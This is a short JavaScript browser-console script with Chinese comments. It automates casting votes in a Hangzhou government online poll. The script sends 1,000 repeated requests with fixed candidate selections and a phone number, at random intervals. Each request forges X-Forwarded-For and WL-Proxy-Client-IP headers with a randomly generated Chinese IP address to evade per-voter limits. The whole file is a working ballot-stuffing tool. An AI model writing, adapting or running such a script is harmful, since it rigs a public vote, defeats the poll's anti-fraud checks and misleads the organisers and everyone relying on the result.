//动态加载jquery（可注释掉）
var script=document.createElement("script");
script.type="text/javascript";
script.src="http://code.jquery.com/jquery-latest.js";
document.getElementsByTagName("head")[0].appendChild(script);
setTimeout(function wait(){/*等待jquery加载完毕*/},5000);

//请求网址
var url="http://web.hangzhou.gov.cn/main/zwdt/ztzj2/wstp2016/wapdo.jsp";
var params="checkbox=442&checkbox=443&checkbox=444&checkbox=445&checkbox=446&phone=13111215167";
//执行次数
var max=1000;
//最小执行间隔(ms)
var minWait = 50;
//最大执行间隔(ms)
var maxWait = 200;
//随机中国ip地址
var randomIp=getRandomIp();
//执行
vote(max,getRandomNum(maxWait,minWait));

var count = 0;
function vote(max,timeWait){
max--;
$.ajax({
	    type : "GET",
	    headers : {"X-Forwarded-For":randomIp,"WL-Proxy-Client-IP":randomIp},
	    contentType : 'application/x-www-form-urlencoded;charset=utf-8',
	    url : url,
	    data:params,
	    dataType : "text",
	    success : function(data) {
	    	count++;
	    	console.log("时间：【"+new Date()+"】 执行成功：【"+count+"】次："+data);
	    if(max>0){
	    	setTimeout(function wait(){
	    		console.log("等待"+(timeWait)+"ms ...");
	    		vote(max,getRandomNum(maxWait,minWait));
	    	},timeWait);
	    }
	    }
	});
}

function getRandomNum(x,y){
	return parseInt(Math.random() * (x - y + 1) + y); 
}
function getRandomIp(){
        var ip1Array = new Array(36,61,106,121,123,171,182,210,222);
        var ip2Array = new Array([56,63],[232,237],[80,95],[76,77],[232,235],[8,15],[80,92],[25,47],[16,95]);
        var ip3=getRandomNum(254,1);
        var ip4=getRandomNum(254,1);
        var randomRange=getRandomNum(8,0);
        var ip1= ip1Array[randomRange];
        var ip2Max= ip2Array[randomRange][1];
        var ip2Min= ip2Array[randomRange][0];
        var ip2=getRandomNum(ip2Max,ip2Min);
        return ip1+"."+ip2+"."+ip3+"."+ip4;
}